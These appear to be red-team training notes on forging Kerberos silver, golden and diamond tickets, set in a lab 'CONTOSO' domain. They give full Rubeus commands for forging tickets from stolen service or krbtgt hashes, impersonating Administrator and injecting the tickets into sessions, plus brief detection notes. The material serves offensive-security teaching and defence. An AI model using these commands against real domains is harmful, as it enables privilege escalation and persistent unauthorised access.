Ticket forgery is a technique [T1558] where an adversary uses stolen secrets to create their own Kerberos tickets offline and inject them into a logon session for use, rather than requesting them legitimately from a KDC.

## 1. Silver Tickets
A 'silver ticket' is a Kerberos service ticket that has been forged using a service's secret (hash/key) [T1558.002] and are used to target a specific service on a specific machine.

#### Use Cases
1. Silver Tickets can be combined with Kerberoasting to gain access to a service with elevated privileges.
	Example: Obtain an MSSQL service account's plaintext password through Kerberoasting. Even if the account lacks SQL sysadmin privileges, use its secret to forge an MSSQL service ticket impersonating a user who has sysadmin privileges.

2. A Silver Ticket can maintain remote access to a compromised server. After gaining local admin access, dump the computer account's secret and use it to forge a ticket for a service such as CIFS, impersonating Domain Administrator. This allows access to the targeted service without relying on the original exploit.

Limitation: Computer account passwords rotate every 30 days by default.

```
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /service:cifs/lon-db-1 /aes256:bc6fd6e8519b52e09f60961beeee083a441c25908e30a6c29b124b516e06945f /user:Administrator /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /nowrap
```

- `/service` is the target service.
- `/aes256` is the AES256 hash of the target computer account.
- `/user` is the username to impersonate.
- `/domain` is the FQDN of the computer's domain.
- `/sid` is the domain SID.

> You will notice that Rubeus uses a user RID of 500 and group RIDs of 520,512,513,519,518 by default.  You can change these with the `/id` and `/groups` parameters.

```
 make_token CONTOSO\Administrator FakePass
```
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:doIFb[...snip...]kYi0x
```
```
ls \\lon-db-1\c$
```

### With Kerberoasting
First, convert the known plaintext credential into its hash equivalents.
```
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /user:mssql_svc /domain:CONTOSO.COM /password:Passw0rd!
```

Then forge the service ticket for _MSSQLSvc/lon-db-1.contoso.com_.
```
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /service:MSSQLSvc/lon-db-1.contoso.com:1433 /rc4:FC525C9683E8FE067095BA2DDC971889 /user:rsteel /id:1108 /groups:513,1106,1107,4602 /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /nowrap
```
### OPSEC

Silver Tickets can be mitigated by enabling PAC validation, which checks the ticket's signature with the KDC. Invalid signatures cause the service to deny access.

Detection:
- Event ID 4624: Successful logon recorded on the target computer.
- Event ID 4769: Service ticket request logged on the domain controller.
- Missing 4769: A 4624 Kerberos logon without a corresponding preceding 4769 may indicate a forged Silver Ticket.
- Anomalous ticket data: Incorrect or unusual information, such as a lowercase Kerberos realm/domain name, may indicate a forged ticket.


## 2. Golden Tickets
A 'golden ticket' is a forged TGT that has been signed with the KDC's secret [T1558.001].  This hash is typically obtained via [DCSync](https://www.zeropointsecurity.co.uk/path-player?courseid=red-team-ops&unit=674b7a8f599d7c0c400975d8) after domain admin privileges have been obtained.  With it, an adversary can forge valid TGTs for any user in the domain and by extension, request service tickets as any user, to any service.

```
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:512920012661247c674784eef6e1b3ba52f64f28f57cf2b3f67246f20e6c722c /user:Administrator /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /nowrap
```

- `/aes256` is the AES256 hash for the krbtgt account.
- `/user` is the username to impersonate.
- `/domain` is the current domain.
- `/sid` is the current domain's SID.

```
make_token CONTOSO\Administrator FakePass
```
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:doIFg[...snip...]uQ09N
```
```
run klist
```

## 3. Diamond Tickets
Functionally, a diamond ticket is no different to a forged TGT - the difference is in how it's created.  Because silver and golden tickets are forged offline, it's up to the adversary to decide what information to put in them.

A diamond ticket is created by requesting a legitimate TGT for a user.  The KDC's secret is then used to decrypt the ticket where the internal information, such as the principal's name, ID, groups, etc, can be changed.   The ticket is then re-encrypted and re-signed with the KDC's secret.

The advantage of this technique is that all the peripheral information in the ticket is perfectly in-line with the domain's policy.  Another is that it makes it more difficult to detected based on missing AS-REQs.
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /krbkey:512920012661247c674784eef6e1b3ba52f64f28f57cf2b3f67246f20e6c722c /ticketuser:Administrator /ticketuserid:500 /domain:CONTOSO.COM /nowrap
```

- `/tgtdeleg` uses the TGT [delegation trick](https://github.com/GhostPack/Rubeus?tab=readme-ov-file#tgtdeleg) to obtain a usable TGT for the current user without needing credentials.
- `/krbkey` is the krbtgt's AES256 hash.
- `/ticketuser` is the user we want to impersonate.
- `/ticketuserid` is the impersonated user's RID.
- `/domain` is the current domain.

Rubeus `describe` has a `/servicekey` parameter which will decrypt and display the ticket's PAC.  If we describe the first ticket, we see that it's a TGT for the current user (as expected).
```
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /servicekey:512920012661247c674784eef6e1b3ba52f64f28f57cf2b3f67246f20e6c722c /ticket:doIFm[...snip...]kNPTQ==
```
> Rubeus sets the Groups field to 520,512,513,519,518 by default, but you can change this with the `/groups` parameter.

```
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /servicekey:512920012661247c674784eef6e1b3ba52f64f28f57cf2b3f67246f20e6c722c /ticket:doIF7[...snip...]kNPTQ==
```
